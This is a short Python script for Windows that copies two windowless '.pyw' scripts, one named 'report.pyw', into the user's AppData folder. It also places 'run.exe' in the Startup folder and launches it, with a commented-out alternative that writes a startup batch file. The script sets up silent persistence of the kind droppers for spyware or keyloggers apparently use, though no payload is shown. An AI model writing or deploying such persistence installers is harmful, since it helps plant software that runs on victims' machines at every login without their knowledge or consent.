import os
from shutil import copyfile
copyfile(
    "main.pyw",
    f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\main.pyw"
)
copyfile(
    "report.pyw",
    f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\report.pyw"
)
copyfile(
    "run.exe",
    f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/run.exe"
)
os.startfile(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/run.exe")

# with open(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runner.bat", "w") as runner:
#     runner.write(f"start C:\\Users\\{os.getlogin()}\\AppData\\Local\\main.pyw")